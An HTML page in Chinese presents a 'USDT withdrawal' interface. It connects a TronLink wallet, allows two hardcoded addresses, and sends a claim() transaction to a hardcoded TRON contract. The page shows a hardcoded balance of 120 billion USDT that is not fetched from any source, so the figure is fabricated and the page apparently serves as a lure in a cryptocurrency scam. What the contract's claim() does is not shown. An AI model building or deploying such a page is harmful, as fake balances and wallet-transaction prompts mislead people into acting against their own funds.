<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="utf-8"/>
  <title>USDT 提现</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body { font-family:sans-serif; text-align:center; padding:30px; }
    p { margin:8px 0; }
    .balance { color:green; font-size:1.4em; }
    #status { margin-top:12px; color:#666; min-height:1.2em; }
    button {
      margin-top:20px;
      padding:10px 20px;
      font-size:1em;
      border:none;
      border-radius:4px;
      background:#28a745;
      color:#fff;
      cursor:pointer;
    }
    button:disabled { background:#ccc; cursor:not-allowed; }
    .tip { margin-top:30px; font-size:0.9em; color:#999; }
  </style>
</head>
<body>

  <p>钱包地址：<span id="addr">未连接</span></p>
  <p class="balance">120,000,000,000 USDT</p>
  <button id="btn" disabled>提现 50 USDT</button>
  <p id="status"></p>
  <p class="tip">仅限授权地址指令性提现</p>

  <script>
    // —— 配置区 —— 
    const ALLOWED = [
      'TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc',
      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
    ];
    const CONTRACT_ADDRESS = 'TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL'; // 部署好的合约地址
    const USDT_DECIMALS   = 6;
    const WITHDRAW_AMOUNT = 50; // 单位 USDT
    const CONTRACT_ABI = [
      { "inputs": [], "name": "claim", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
    ];

    const $addr   = document.getElementById('addr');
    const $status = document.getElementById('status');
    const $btn    = document.getElementById('btn');

    // 轮询等待 tronWeb 就绪
    async function waitForTronLink(timeout = 10000) {
      const start = Date.now();
      while (Date.now() - start < timeout) {
        if (window.tronWeb && tronWeb.ready) return true;
        await new Promise(r => setTimeout(r, 300));
      }
      return false;
    }

    async function init() {
      const ready = await waitForTronLink();
      if (!ready) {
        $status.textContent = '未检测到 TronLink 钱包';
        return;
      }

      // TronLink 就绪
      const addr = tronWeb.defaultAddress.base58;
      $addr.textContent = addr;

      if (!ALLOWED.includes(addr)) {
        $status.textContent = '非授权地址 ❌';
        return;
      }

      // 授权地址
      $status.textContent = '地址已授权 ✅';
      $btn.disabled = false;

      // 获取合约实例
      const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);

      $btn.onclick = async () => {
        $btn.disabled = true;
        $status.textContent = '交易发送中，请在 TronLink 确认…';
        try {
          // 发起 claim()
          const tx = await contract.claim().send();
          console.log('txid', tx);
          $status.textContent = '提现成功，txid：' + tx;
        } catch (e) {
          console.error(e);
          $status.textContent = '提现失败：' + (e.message || e);
        } finally {
          $btn.disabled = false;
        }
      };
    }

    window.addEventListener('load', init);
  </script>

</body>
</html>
